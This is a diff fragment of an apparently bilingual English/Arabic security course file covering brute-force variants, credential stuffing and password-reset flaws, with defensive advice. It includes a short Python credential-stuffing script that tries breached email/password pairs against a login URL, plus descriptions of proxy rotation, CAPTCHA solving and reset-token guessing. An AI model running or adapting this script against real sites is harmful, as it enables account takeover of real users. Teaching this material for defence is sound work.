+          "type": "text",
+          "value": {
+            "en": "In practice, attackers rarely use pure brute force because it is inefficient. Instead, they use optimized approaches. Dictionary attacks try words from common password lists first. Hybrid attacks combine dictionary words with numbers and symbols, testing variations like password1, password!, Password123. Mask attacks use patterns where the attacker specifies the structure, such as an uppercase letter followed by six lowercase letters and two digits. This dramatically reduces the search space. Advanced attackers also use rainbow tables, which are precomputed hashes of millions of passwords. These allow instant cracking of hashed passwords without testing each combination individually.",
+            "ar": "في الممارسة العملية، نادراً ما يستخدم المهاجمون القوة الغاشمة الخالصة لأنها غير فعالة. بدلاً من ذلك، يستخدمون أساليب محسّنة. تحاول هجمات القاموس كلمات من قوائم كلمات المرور الشائعة أولاً. تجمع الهجمات الهجينة بين كلمات القاموس والأرقام والرموز، لاختبار أشكال مثل password1 و password! و Password123. تستخدم هجمات القناع أنماطاً حيث يحدد المهاجم البنية، مثل حرف كبير متبوع بستة أحرف صغيرة ورقمين. هذا يقلل بشكل كبير من مساحة البحث. يستخدم المهاجمون المتقدمون أيضاً جداول قوس قزح، وهي تجزئة محسوبة مسبقاً لملايين كلمات المرور. تسمح هذه بكسر فوري لكلمات المرور المجزأة دون اختبار كل تركيبة بشكل فردي."
+          }
+        },
+        {
+          "id": 11,
+          "type": "orderedList",
+          "title": {
+            "en": "Evolution of a Brute Force Attack: From Simple to Sophisticated",
+            "ar": "تطور هجوم القوة الغاشمة: من البسيط إلى المتطور"
+          },
+          "items": [
+            {
+              "subtitle": {
+                "en": "Pure Brute Force (Least Efficient)",
+                "ar": "القوة الغاشمة الخالصة (الأقل كفاءة)"
+              },
+              "text": {
+                "en": "Attacker tests every possible combination starting from shortest to longest. This includes a, b, c, then aa, ab, ac, continuing through all possibilities. Extremely slow for passwords longer than 8 characters.",
+                "ar": "يختبر المهاجم كل تركيبة ممكنة بدءاً من الأقصر إلى الأطول. يشمل هذا a و b و c، ثم aa و ab و ac، مستمراً عبر جميع الاحتمالات. بطيء للغاية لكلمات المرور الأطول من 8 أحرف."
+              },
+              "example": {
+                "en": "Example: Testing all 8-character lowercase passwords would take years even on powerful computers.",
+                "ar": "مثال: اختبار جميع كلمات المرور المكونة من 8 أحرف صغيرة سيستغرق سنوات حتى على أجهزة كمبيوتر قوية."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Dictionary Attack (Common First Step)",
+                "ar": "هجوم القاموس (الخطوة الأولى الشائعة)"
+              },
+              "text": {
+                "en": "Attacker uses a list of common passwords compiled from previous breaches and common patterns. This list might contain 100,000 to 10 million entries. Tests these known passwords first before attempting other methods.",
+                "ar": "يستخدم المهاجم قائمة بكلمات المرور الشائعة المجمعة من الاختراقات السابقة والأنماط الشائعة. قد تحتوي هذه القائمة على 100,000 إلى 10 ملايين إدخال. يختبر كلمات المرور المعروفة هذه أولاً قبل تجربة طرق أخرى."
+              },
+              "example": {
+                "en": "Example: Dictionary containing password, 123456, qwerty, admin, welcome will crack 5-10% of accounts immediately.",
+                "ar": "مثال: قاموس يحتوي على password و 123456 و qwerty و admin و welcome سيكسر 5-10% من الحسابات فوراً."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Hybrid Attack (Dictionary Plus Variations)",
+                "ar": "الهجوم الهجين (القاموس بالإضافة إلى الأشكال)"
+              },
+              "text": {
+                "en": "Attacker takes dictionary words and applies common transformations. This includes adding numbers at the end (password1, password2024), adding symbols (password!, p@ssword), or capitalizing first letter (Password). Catches users who think simple modifications make passwords secure.",
+                "ar": "يأخذ المهاجم كلمات القاموس ويطبق تحويلات شائعة. يشمل هذا إضافة أرقام في النهاية (password1، password2024)، إضافة رموز (password!، p@ssword)، أو كتابة الحرف الأول بأحرف كبيرة (Password). يلتقط المستخدمين الذين يعتقدون أن التعديلات البسيطة تجعل كلمات المرور آمنة."
+              },
+              "example": {
+                "en": "Example: If password fails, attacker automatically tries Password, password1, password123, Password123!, etc.",
+                "ar": "مثال: إذا فشلت password، يحاول المهاجم تلقائياً Password و password1 و password123 و Password123!، إلخ."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Mask Attack (Pattern-Based)",
+                "ar": "هجوم القناع (القائم على الأنماط)"
+              },
+              "text": {
+                "en": "Attacker defines a password structure pattern and tests only combinations matching that pattern. For example, pattern might be: one uppercase letter, five lowercase letters, two digits. This reduces billions of possibilities to millions, making the attack much faster.",
+                "ar": "يحدد المهاجم نمط بنية كلمة مرور ويختبر فقط التركيبات المطابقة لهذا النمط. على سبيل المثال، قد يكون النمط: حرف كبير واحد، خمسة أحرف صغيرة، رقمان. هذا يقلل من مليارات الاحتمالات إلى ملايين، مما يجعل الهجوم أسرع بكثير."
+              },
+              "example": {
+                "en": "Example: Pattern Ulllldd matches Summer24, Winter25, Spring26, etc. Much faster than testing all possible 8-character combinations.",
+                "ar": "مثال: النمط Ulllldd يطابق Summer24 و Winter25 و Spring26، إلخ. أسرع بكثير من اختبار جميع التركيبات المحتملة المكونة من 8 أحرف."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Credential Stuffing (Reuse Attack)",
+                "ar": "حشو بيانات الاعتماد (هجوم إعادة الاستخدام)"
+              },
+              "text": {
+                "en": "Attacker uses username and password pairs stolen from one breach and tries them on many other websites. Exploits the fact that users reuse passwords across multiple accounts. Does not require cracking passwords since they are already known from previous breaches.",
+                "ar": "يستخدم المهاجم أزواج أسماء المستخدمين وكلمات المرور المسروقة من اختراق واحد ويجربها على العديد من المواقع الأخرى. يستغل حقيقة أن المستخدمين يعيدون استخدام كلمات المرور عبر حسابات متعددة. لا يتطلب كسر كلمات المرور لأنها معروفة بالفعل من الاختراقات السابقة."
+              },
+              "example": {
+                "en": "Example: Email and password from a gaming site breach are tested against banks, social media, and shopping sites. Often successful for 0.1-1% of attempts.",
+                "ar": "مثال: يتم اختبار البريد الإلكتروني وكلمة المرور من اختراق موقع ألعاب ضد البنوك ووسائل التواصل الاجتماعي ومواقع التسوق. غالباً ما تكون ناجحة في 0.1-1% من المحاولات."
+              }
+            }
+          ]
+        },
+        {
+          "id": 12,
+          "type": "text",
+          "value": {
+            "en": "The speed of brute force attacks depends on several factors. First is the computational power available to the attacker. A single computer can test thousands of passwords per second against a local hash file. A network of compromised computers or a botnet can test millions per second. Cloud computing platforms allow attackers to rent massive processing power temporarily for attacks. Second is whether the attack is online or offline. Online attacks target a live login page and are limited by network speed and server response time. Offline attacks work against stolen password hashes and are only limited by computational power. Third is the hashing algorithm used. Weak algorithms like MD5 can be cracked quickly, while strong algorithms like bcrypt with high cost factors significantly slow down attackers.",
+            "ar": "تعتمد سرعة هجمات القوة الغاشمة على عدة عوامل. الأول هو القدرة الحسابية المتاحة للمهاجم. يمكن لجهاز كمبيوتر واحد اختبار آلاف كلمات المرور في الثانية مقابل ملف تجزئة محلي. يمكن لشبكة من أجهزة الكمبيوتر المخترقة أو الشبكة الروبوتية اختبار الملايين في الثانية. تسمح منصات الحوسبة السحابية للمهاجمين باستئجار قوة معالجة ضخمة مؤقتاً للهجمات. الثاني هو ما إذا كان الهجوم متصلاً أو غير متصل. تستهدف الهجمات المتصلة صفحة تسجيل دخول مباشرة ومحدودة بسرعة الشبكة ووقت استجابة الخادم. تعمل الهجمات غير المتصلة ضد تجزئات كلمات المرور المسروقة ومحدودة فقط بالقدرة الحسابية. الثالث هو خوارزمية التجزئة المستخدمة. يمكن كسر الخوارزميات الضعيفة مثل MD5 بسرعة، بينما تبطئ الخوارزميات القوية مثل bcrypt مع عوامل التكلفة العالية المهاجمين بشكل كبير."
+          }
+        },
+        {
+          "id": 13,
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "Password length is the most important factor in resisting brute force attacks. A 12-character random password is exponentially harder to crack than an 8-character password, even if both use the same character types.",
+            "ar": "طول كلمة المرور هو العامل الأهم في مقاومة هجمات القوة الغاشمة. كلمة مرور عشوائية مكونة من 12 حرفاً أصعب بشكل أسي في الكسر من كلمة مرور مكونة من 8 أحرف، حتى لو استخدم كلاهما نفس أنواع الأحرف."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 14,
+          "type": "hr"
+        },
+        {
+          "id": 15,
+          "type": "title",
+          "value": {
+            "en": "Credential Stuffing: Exploiting Password Reuse at Scale",
+            "ar": "حشو بيانات الاعتماد: استغلال إعادة استخدام كلمة المرور على نطاق واسع"
+          }
+        },
+        {
+          "id": 16,
+          "type": "text",
+          "value": {
+            "en": "Credential stuffing is a highly effective attack that exploits human behavior rather than technical weaknesses. The attack works because most people use the same username and password across multiple websites and services. When a database breach occurs at one company, attackers obtain millions of email addresses and their associated passwords. They then test these credentials systematically across thousands of other popular websites. The success rate is typically between 0.1% and 2%, which seems small until you realize that testing 10 million credentials at a 1% success rate yields 100,000 compromised accounts. For attackers, this represents a massive return on investment with minimal effort.",
+            "ar": "حشو بيانات الاعتماد هو هجوم فعال للغاية يستغل السلوك البشري بدلاً من نقاط الضعف التقنية. يعمل الهجوم لأن معظم الناس يستخدمون نفس اسم المستخدم وكلمة المرور عبر مواقع وخدمات متعددة. عندما يحدث اختراق لقاعدة بيانات في شركة واحدة، يحصل المهاجمون على ملايين عناوين البريد الإلكتروني وكلمات المرور المرتبطة بها. ثم يختبرون بيانات الاعتماد هذه بشكل منهجي عبر آلاف المواقع الشعبية الأخرى. معدل النجاح عادة بين 0.1% و 2%، والذي يبدو صغيراً حتى تدرك أن اختبار 10 ملايين بيانات اعتماد بمعدل نجاح 1% يحقق 100,000 حساب مخترق. بالنسبة للمهاجمين، يمثل هذا عائداً ضخماً على الاستثمار بأقل جهد."
+          }
+        },
+        {
+          "id": 17,
+          "type": "text",
+          "value": {
+            "en": "The attack infrastructure for credential stuffing is sophisticated. Attackers use automated tools that can distribute login attempts across thousands of IP addresses to avoid detection. They employ residential proxy networks that make requests appear to come from legitimate home internet connections rather than data centers. They rotate user agent strings to mimic different browsers and devices. Many credential stuffing tools include CAPTCHA solving services, either automated or using human workers paid to solve challenges. The attacks are often launched from botnets of compromised computers, making them difficult to trace back to the original attacker. This combination of techniques allows attackers to test credentials at high speed while evading most security defenses.",
+            "ar": "البنية التحتية للهجوم لحشو بيانات الاعتماد متطورة. يستخدم المهاجمون أدوات آلية يمكنها توزيع محاولات تسجيل الدخول عبر آلاف عناوين IP لتجنب الكشف. يستخدمون شبكات بروكسي سكنية تجعل الطلبات تبدو وكأنها تأتي من اتصالات إنترنت منزلية شرعية بدلاً من مراكز البيانات. يقومون بتدوير سلاسل وكيل المستخدم لمحاكاة متصفحات وأجهزة مختلفة. تتضمن العديد من أدوات حشو بيانات الاعتماد خدمات حل CAPTCHA، إما آلية أو باستخدام عمال بشريين يتقاضون أجراً لحل التحديات. غالباً ما يتم إطلاق الهجمات من شبكات الروبوتات لأجهزة الكمبيوتر المخترقة، مما يجعل من الصعب تعقبها إلى المهاجم الأصلي. يسمح هذا المزيج من التقنيات للمهاجمين باختبار بيانات الاعتماد بسرعة عالية مع تجنب معظم الدفاعات الأمنية."
+          }
+        },
+        {
+          "id": 18,
+          "type": "list",
+          "title": {
+            "en": "How Credential Stuffing Impacts Different Industries",
+            "ar": "كيف يؤثر حشو بيانات الاعتماد على الصناعات المختلفة"
+          },
+          "items": {
+            "en": [
+              "E-commerce: Attackers access accounts to steal stored payment information, use saved gift cards and credits, or make fraudulent purchases with stored payment methods",
+              "Financial services: Compromised banking accounts allow direct theft of funds, wire transfers, and access to investment portfolios",
+              "Streaming services: Attackers sell access to compromised streaming accounts on black markets or use them personally while owner remains unaware",
+              "Gaming platforms: Stolen accounts contain valuable virtual items, currencies, and characters that can be sold or transferred",
+              "Healthcare portals: Attackers access medical records for identity theft purposes or to obtain prescription information for drug fraud",
+              "Corporate systems: Business email and VPN access can lead to corporate espionage, data theft, and ransomware deployment"
+            ],
+            "ar": [
+              "التجارة الإلكترونية: يصل المهاجمون إلى الحسابات لسرقة معلومات الدفع المخزنة، واستخدام بطاقات الهدايا والائتمانات المحفوظة، أو إجراء عمليات شراء احتيالية بطرق الدفع المخزنة",
+              "الخدمات المالية: تسمح الحسابات المصرفية المخترقة بالسرقة المباشرة للأموال والتحويلات البرقية والوصول إلى محافظ الاستثمار",
+              "خدمات البث: يبيع المهاجمون الوصول إلى حسابات البث المخترقة في الأسواق السوداء أو يستخدمونها شخصياً بينما يظل المالك غير مدرك",
+              "منصات الألعاب: تحتوي الحسابات المسروقة على عناصر افتراضية وعملات وشخصيات قيمة يمكن بيعها أو نقلها",
+              "بوابات الرعاية الصحية: يصل المهاجمون إلى السجلات الطبية لأغراض سرقة الهوية أو للحصول على معلومات الوصفات الطبية للاحتيال في المخدرات",
+              "أنظمة الشركات: يمكن أن يؤدي الوصول إلى البريد الإلكتروني للشركات و VPN إلى التجسس على الشركات وسرقة البيانات ونشر برامج الفدية"
+            ]
+          }
+        },
+        {
+          "id": 19,
+          "type": "code",
+          "language": "python",
+          "value": "# Example: Simplified demonstration of how credential stuffing tools work\n# Educational purpose only - DO NOT use for actual attacks\n\nimport requests\nimport time\n\n# Simulated list of credentials from a breach\ncredentials = [\n    (\"user1@example.com\", \"Password123\"),\n    (\"user2@example.com\", \"Welcome2024\"),\n    (\"user3@example.com\", \"Summer2023\")\n]\n\n# Target login endpoint\nlogin_url = \"https://example.com/login\"\n\n# Attempt login with each credential pair\nfor email, password in credentials:\n    data = {\n        \"email\": email,\n        \"password\": password\n    }\n    \n    # Send login request\n    response = requests.post(login_url, data=data)\n    \n    # Check if login was successful\n    if \"Welcome\" in response.text or response.status_code == 200:\n        print(f\"SUCCESS: {email} with password {password}\")\n    else:\n        print(f\"Failed: {email}\")\n    \n    # Delay to avoid rate limiting (real attacks use proxies)\n    time.sleep(1)\n\n# Real attacks use:\n# - Millions of credentials\n# - Thousands of proxy IPs\n# - Distributed systems\n# - CAPTCHA solving services"
+        },
+        {
+          "id": 20,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "Never reuse passwords across different accounts, especially for critical services like email and banking. Use a password manager to generate and store unique passwords for every account. This is the single most effective defense against credential stuffing.",
+            "ar": "لا تعد استخدام كلمات المرور عبر حسابات مختلفة أبداً، خاصة للخدمات الحرجة مثل البريد الإلكتروني والخدمات المصرفية. استخدم مدير كلمات مرور لإنشاء وتخزين كلمات مرور فريدة لكل حساب. هذا هو الدفاع الأكثر فعالية ضد حشو بيانات الاعتماد."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 21,
+          "type": "terminal",
+          "label": {
+            "en": "Example: Checking if your email was in a known breach",
+            "ar": "مثال: التحقق مما إذا كان بريدك الإلكتروني في اختراق معروف"
+          },
+          "value": "user@system:~$ curl https://haveibeenpwned.com/api/v3/breachedaccount/user@example.com\n[\n  {\n    \"Name\": \"Adobe\",\n    \"Title\": \"Adobe\",\n    \"Domain\": \"adobe.com\",\n    \"BreachDate\": \"2013-10-04\",\n    \"PwnCount\": 152445165,\n    \"Description\": \"In October 2013, 153 million Adobe accounts were breached...\"\n  }\n]\n\nuser@system:~$ # If your email appears in breach databases, immediately change\nuser@system:~$ # passwords on all sites where you used the same credentials"
+        }
+      ]
+    },
+    {
+      "id": "topic-5",
+      "title": {
+        "en": "Account Recovery and Password Reset Flaws: The Hidden Backdoor",
+        "ar": "عيوب استرداد الحساب وإعادة تعيين كلمة المرور: الباب الخلفي المخفي"
+      },
+      "elements": [
+        {
+          "id": 1,
+          "type": "title",
+          "value": {
+            "en": "Why Password Reset Is a Critical Security Feature",
+            "ar": "لماذا تُعد إعادة تعيين كلمة المرور ميزة أمان حرجة"
+          }
+        },
+        {
+          "id": 2,
+          "type": "text",
+          "value": {
+            "en": "Password reset functionality exists because users forget their passwords. Every application must provide a way for legitimate users to regain access to their accounts without contacting support staff. This creates a fundamental security challenge: the system must verify identity without requiring the password. If the verification process is too weak, attackers can abuse it to take over accounts. If it is too strict, legitimate users get locked out of their accounts permanently. Finding the right balance is difficult, and many applications fail to implement secure password reset flows. Attackers specifically target password reset mechanisms because they often represent the weakest authentication point in the entire system.",
+            "ar": "توجد وظيفة إعادة تعيين كلمة المرور لأن المستخدمين ينسون كلمات مرورهم. يجب على كل تطبيق توفير طريقة للمستخدمين الشرعيين لاستعادة الوصول إلى حساباتهم دون الاتصال بموظفي الدعم. هذا يخلق تحدياً أمنياً أساسياً: يجب على النظام التحقق من الهوية دون طلب كلمة المرور. إذا كانت عملية التحقق ضعيفة جداً، يمكن للمهاجمين إساءة استخدامها للاستيلاء على الحسابات. إذا كانت صارمة جداً، يتم قفل المستخدمين الشرعيين خارج حساباتهم بشكل دائم. إيجاد التوازن الصحيح صعب، والعديد من التطبيقات تفشل في تنفيذ تدفقات إعادة تعيين كلمة مرور آمنة. يستهدف المهاجمون على وجه التحديد آليات إعادة تعيين كلمة المرور لأنها غالباً ما تمثل أضعف نقطة مصادقة في النظام بأكمله."
+          }
+        },
+        {
+          "id": 3,
+          "type": "text",
+          "value": {
+            "en": "The typical password reset flow works as follows: a user clicks Forgot Password and enters their email address or username. The system verifies this identifier exists and sends a password reset link to the registered email address. The link contains a unique token that proves the person clicking it has access to the email account. When clicked, the token is verified and the user is allowed to set a new password. This process seems secure on the surface, but numerous vulnerabilities can appear in each step. The token might be predictable, allowing attackers to generate valid tokens without receiving the email. The token might never expire, remaining valid for days or weeks after being sent. The system might accept old tokens even after a new password has been set. Any of these flaws can lead to account takeover.",
+            "ar": "يعمل تدفق إعادة تعيين كلمة المرور النموذجي كما يلي: ينقر مستخدم على نسيت كلمة المرور ويدخل عنوان بريده الإلكتروني أو اسم المستخدم. يتحقق النظام من وجود هذا المعرف ويرسل رابط إعادة تعيين كلمة المرور إلى عنوان البريد الإلكتروني المسجل. يحتوي الرابط على رمز فريد يثبت أن الشخص الذي ينقر عليه لديه وصول إلى حساب البريد الإلكتروني. عند النقر، يتم التحقق من الرمز ويُسمح للمستخدم بتعيين كلمة مرور جديدة. تبدو هذه العملية آمنة على السطح، ولكن يمكن أن تظهر العديد من الثغرات في كل خطوة. قد يكون الرمز قابلاً للتنبؤ، مما يسمح للمهاجمين بإنشاء رموز صالحة دون تلقي البريد الإلكتروني. قد لا تنتهي صلاحية الرمز أبداً، بل يظل صالحاً لأيام أو أسابيع بعد إرساله. قد يقبل النظام الرموز القديمة حتى بعد تعيين كلمة مرور جديدة. أي من هذه العيوب يمكن أن يؤدي إلى الاستيلاء على الحساب."
+          }
+        },
+        {
+          "id": 1772330265610.7476,
+          "type": "image",
+          "srcKey": "",
+          "size": "small",
+          "imageUrl": "https://pub-cb38e65ea6bd411eb827a8641fdcc72d.r2.dev/OWASP%20Top%2010%20-%20Authentication%20%26%20Authorization/password%20reset%20flow.webp"
+        },
+        {
+          "id": 5,
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "Password reset tokens should be cryptographically random, at least 32 bytes long, expire within 15-60 minutes, be single-use only, and be invalidated immediately when the password is changed or a new reset is requested.",
+            "ar": "يجب أن تكون رموز إعادة تعيين كلمة المرور عشوائية من الناحية التشفيرية، بطول 32 بايت على الأقل، وتنتهي صلاحيتها في غضون 15-60 دقيقة، وتكون للاستخدام مرة واحدة فقط، ويتم إبطالها فوراً عند تغيير كلمة المرور أو طلب إعادة تعيين جديدة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 6,
+          "type": "hr"
+        },
+        {
+          "id": 7,
+          "type": "title",
+          "value": {
+            "en": "Common Password Reset Vulnerabilities Exploited by Attackers",
+            "ar": "ثغرات إعادة تعيين كلمة المرور الشائعة التي يستغلها المهاجمون"
+          }
+        },
+        {
+          "id": 8,
+          "type": "text",
+          "value": {
+            "en": "One of the most dangerous vulnerabilities is predictable reset tokens. If tokens are generated using weak randomness or follow a sequential pattern, attackers can guess valid tokens without needing access to the victim's email. For example, if tokens are simple incrementing numbers like 1001, 1002, 1003, an attacker can request a reset for their own account, observe the token they receive, then try nearby numbers to access other accounts. Even tokens that appear random can be predictable if they use weak random number generators or insufficient entropy. Modern systems must use cryptographically secure random number generators and create tokens with at least 128 bits of randomness to make guessing attacks infeasible.",
+            "ar": "واحدة من أخطر الثغرات هي رموز إعادة التعيين القابلة للتنبؤ. إذا تم إنشاء الرموز باستخدام عشوائية ضعيفة أو اتبعت نمطاً متسلسلاً، يمكن للمهاجمين تخمين رموز صالحة دون الحاجة إلى الوصول إلى البريد الإلكتروني للضحية. على سبيل المثال، إذا كانت الرموز أرقاماً متزايدة بسيطة مثل 1001 و 1002 و 1003، يمكن للمهاجم طلب إعادة تعيين لحسابه الخاص، ومراقبة الرمز الذي يتلقاه، ثم تجربة أرقام قريبة للوصول إلى حسابات أخرى. حتى الرموز التي تبدو عشوائية يمكن التنبؤ بها إذا استخدمت مولدات أرقام عشوائية ضعيفة أو إنتروبيا غير كافية. يجب على الأنظمة الحديثة استخدام مولدات أرقام عشوائية آمنة من الناحية التشفيرية وإنشاء رموز بـ 128 بت من العشوائية على الأقل لجعل هجمات التخمين غير قابلة للتطبيق."
+          }
+        },
+        {
+          "id": 9,
+          "type": "text",
+          "value": {
+            "en": "Token expiration is another critical security control that is often missing or improperly implemented. Reset tokens should have a short lifetime, typically 15 to 60 minutes. This limits the window of opportunity for attackers who intercept tokens or try to guess them. Many applications make the mistake of never expiring tokens or using excessively long expiration times like 24 hours or 7 days. This means an attacker who gains access to a password reset email weeks after it was sent can still use the token to take over the account. Additionally, tokens must be immediately invalidated when the password is successfully changed. Some systems fail to do this, allowing multiple password changes with the same token or allowing old tokens to remain valid indefinitely.",
+            "ar": "انتهاء صلاحية الرمز هو رقابة أمنية حرجة أخرى غالباً ما تكون مفقودة أو منفذة بشكل غير صحيح. يجب أن يكون لرموز إعادة التعيين عمر قصير، عادةً من 15 إلى 60 دقيقة. هذا يحد من نافذة الفرصة للمهاجمين الذين يعترضون الرموز أو يحاولون تخمينها. ترتكب العديد من التطبيقات خطأ عدم انتهاء صلاحية الرموز أبداً أو استخدام أوقات انتهاء صلاحية طويلة بشكل مفرط مثل 24 ساعة أو 7 أيام. هذا يعني أن المهاجم الذي يحصل على وصول إلى بريد إلكتروني لإعادة تعيين كلمة المرور بعد أسابيع من إرساله يمكنه أن يستخدم الرمز للاستيلاء على الحساب. بالإضافة إلى ذلك، يجب إبطال الرموز فوراً عند تغيير كلمة المرور بنجاح. تفشل بعض الأنظمة في القيام بذلك، مما يسمح بتغييرات متعددة لكلمة المرور بنفس الرمز أو السماح للرموز القديمة بالبقاء صالحة إلى أجل غير مسمى."
+          }
+        },
+        {
+          "id": 10,
+          "type": "text",
+          "value": {
+            "en": "Security questions represent one of the weakest forms of account recovery. Many applications use questions like What is your mother's maiden name?, What city were you born in?, or What was your first pet's name? The answers to these questions are often publicly available through social media profiles, public records, or simple conversation. Even when the information is not public, the pool of possible answers is limited. For example, there are only a few thousand common city names and a few hundred popular pet names. Attackers can use targeted research or brute force to discover security question answers. Some users make the problem worse by providing fake answers that they then forget. Modern security best practices recommend avoiding security questions entirely and using alternative recovery methods like backup email addresses or trusted phone numbers.",
+            "ar": "تمثل أسئلة الأمان واحدة من أضعف أشكال استرداد الحساب. تستخدم العديد من التطبيقات أسئلة مثل ما هو اسم والدتك قبل الزواج؟، ما هي المدينة التي ولدت فيها؟، أو ما هو اسم حيوانك الأليف الأول؟ غالباً ما تكون إجابات هذه الأسئلة متاحة للعامة من خلال ملفات تعريف وسائل التواصل الاجتماعي أو السجلات العامة أو المحادثة البسيطة. حتى عندما لا تكون المعلومات عامة، فإن مجموعة الإجابات المحتملة محدودة. على سبيل المثال، هناك فقط بضعة آلاف من أسماء المدن الشائعة وبضع مئات من أسماء الحيوانات الأليفة الشعبية. يمكن للمهاجمين استخدام البحث المستهدف أو القوة الغاشمة لاكتشاف إجابات أسئلة الأمان. يجعل بعض المستخدمين المشكلة أسوأ من خلال تقديم إجابات مزيفة ينسونها بعد ذلك. توصي أفضل الممارسات الأمنية الحديثة بتجنب أسئلة الأمان تماماً واستخدام طرق استرداد بديلة مثل عناوين البريد الإلكتروني الاحتياطية أو أرقام الهواتف الموثوقة."
+          }
+        },
+        {
+          "id": 11,
+          "type": "table",
+          "title": {
+            "en": "Password Reset Vulnerabilities and Attack Scenarios",
+            "ar": "ثغرات إعادة تعيين كلمة المرور وسيناريوهات الهجوم"
+          },
+          "headers": {
+            "en": [
+              "Vulnerability",
+              "How It Manifests",
+              "Attack Method",
+              "Impact"
+            ],
+            "ar": [
+              "الثغرة",
+              "كيف تظهر",
+              "طريقة الهجوم",
+              "التأثير"
+            ]
+          },
+          "rows": [
+            {
+              "en": [
+                "Predictable tokens",
+                "Sequential numbers or weak randomness",
+                "Attacker requests reset for own account, then tries nearby token values for target account",
+                "Account takeover without email access"
+              ],
+              "ar": [
+                "رموز قابلة للتنبؤ",
+                "أرقام متسلسلة أو عشوائية ضعيفة",
+                "يطلب المهاجم إعادة تعيين لحسابه الخاص، ثم يحاول قيم رموز قريبة لحساب الهدف",
+                "الاستيلاء على الحساب دون الوصول إلى البريد الإلكتروني"
+              ]
+            },
+            {
+              "en": [
+                "No token expiration",
+                "Tokens remain valid forever or for very long periods",
+                "Attacker gains access to old emails or intercepts token, uses it days later",
+                "Extended attack window, old compromised emails become permanent backdoors"
+              ],
+              "ar": [
+                "عدم انتهاء صلاحية الرمز",
+                "تظل الرموز صالحة إلى الأبد أو لفترات طويلة جداً",
+                "يحصل المهاجم على وصول إلى رسائل بريد إلكتروني قديمة أو يعترض الرمز، ويستخدمه بعد أيام",
+                "نافذة هجوم ممتدة، تصبح رسائل البريد الإلكتروني القديمة المخترقة أبواباً خلفية دائمة"
+              ]
+            },
+            {
+              "en": [
+                "Token not single-use",
+                "Same token can be used multiple times",
+                "Attacker uses intercepted token, victim also uses it, attacker uses it again after victim changes password",
+                "Multiple password changes possible, attacker maintains access even after victim responds"
+              ],
+              "ar": [
+                "الرمز ليس للاستخدام مرة واحدة",
+                "يمكن استخدام نفس الرمز عدة مرات",
+                "يستخدم المهاجم الرمز المعترض، يستخدمه الضحية أيضاً، يستخدمه المهاجم مرة أخرى بعد أن يغير الضحية كلمة المرور",
+                "تغييرات كلمة مرور متعددة ممكنة، يحافظ المهاجم على الوصول حتى بعد استجابة الضحية"
+              ]
+            },
+            {
+              "en": [
+                "Weak security questions",
+                "Questions with publicly available or easily guessable answers",
+                "Attacker researches victim on social media or guesses from limited answer space",
+                "Account recovery bypass without any technical attack"
+              ],
+              "ar": [
+                "أسئلة أمان ضعيفة",
+                "أسئلة بإجابات متاحة للعامة أو يسهل تخمينها",
+                "يبحث المهاجم عن الضحية على وسائل التواصل الاجتماعي أو يخمن من مساحة إجابة محدودة",
+                "تجاوز استرداد الحساب دون أي هجوم تقني"
+              ]
+            },
+            {
+              "en": [
+                "Username enumeration",
+                "System reveals whether username/email exists during reset request",
+                "Attacker builds list of valid usernames to target with other attacks",
+                "Information disclosure aids credential stuffing and targeted attacks"
+              ],
+              "ar": [
+                "إحصاء أسماء المستخدمين",
+                "يكشف النظام عما إذا كان اسم المستخدم/البريد الإلكتروني موجوداً أثناء طلب إعادة التعيين",
+                "يبني المهاجم قائمة بأسماء المستخدمين الصالحة لاستهدافها بهجمات أخرى",
+                "يساعد الكشف عن المعلومات في حشو بيانات الاعتماد والهجمات المستهدفة"
+              ]
+            }
+          ]
+        },
+        {
+          "id": 12,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "Never reveal personal information like mother's maiden name, place of birth, or pet names on social media. Attackers actively mine social profiles specifically to answer security questions and bypass account recovery mechanisms.",
+            "ar": "لا تكشف أبداً عن معلومات شخصية مثل اسم والدتك قبل الزواج أو مكان الميلاد أو أسماء الحيوانات الأليفة على وسائل التواصل الاجتماعي. يقوم المهاجمون بنشاط بتعدين الملفات الشخصية الاجتماعية على وجه التحديد للإجابة على أسئلة الأمان وتجاوز آليات استرداد الحساب."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 13,
+          "type": "hr"
+        },
+        {
+          "id": 14,
+          "type": "title",
+          "value": {
+            "en": "Advanced Reset Attacks: Token Interception and Email Compromise",
+            "ar": "هجمات إعادة التعيين المتقدمة: اعتراض الرموز واختراق البريد الإلكتروني"
+          }
+        },
+        {
+          "id": 15,
+          "type": "text",
+          "value": {
+            "en": "Even when password reset mechanisms are implemented correctly, attackers have other methods to exploit them. The most direct approach is email compromise. If an attacker gains access to a victim's email account, they can request password resets for any linked service and receive the reset tokens directly. This is why email security is paramount - your email account effectively serves as the master key to all your other accounts. Attackers target email accounts specifically for this reason, using phishing, credential stuffing, or exploiting email provider vulnerabilities. Once inside an email account, they can systematically reset passwords for banking, social media, shopping, and work accounts. Many victims do not realize their email was compromised until they lose access to multiple accounts simultaneously.",
+            "ar": "حتى عندما يتم تنفيذ آليات إعادة تعيين كلمة المرور بشكل صحيح، لدى المهاجمين طرق أخرى لاستغلالها. النهج الأكثر مباشرة هو اختراق البريد الإلكتروني. إذا حصل مهاجم على وصول إلى حساب البريد الإلكتروني للضحية، يمكنه طلب إعادة تعيين كلمات المرور لأي خدمة مرتبطة وتلقي رموز إعادة التعيين مباشرة. لهذا السبب أمن البريد الإلكتروني أمر بالغ الأهمية - يعمل حساب بريدك الإلكتروني فعلياً كمفتاح رئيسي لجميع حساباتك الأخرى. يستهدف المهاجمون حسابات البريد الإلكتروني على وجه التحديد لهذا السبب، باستخدام التصيد أو حشو بيانات الاعتماد أو استغلال ثغرات مزود البريد الإلكتروني. بمجرد الدخول إلى حساب بريد إلكتروني، يمكنهم إعادة تعيين كلمات المرور بشكل منهجي للخدمات المصرفية ووسائل التواصل الاجتماعي والتسوق وحسابات العمل. لا يدرك العديد من الضحايا أن بريدهم الإلكتروني قد تم اختراقه حتى يفقدوا الوصول إلى حسابات متعددة في وقت واحد."
+          }
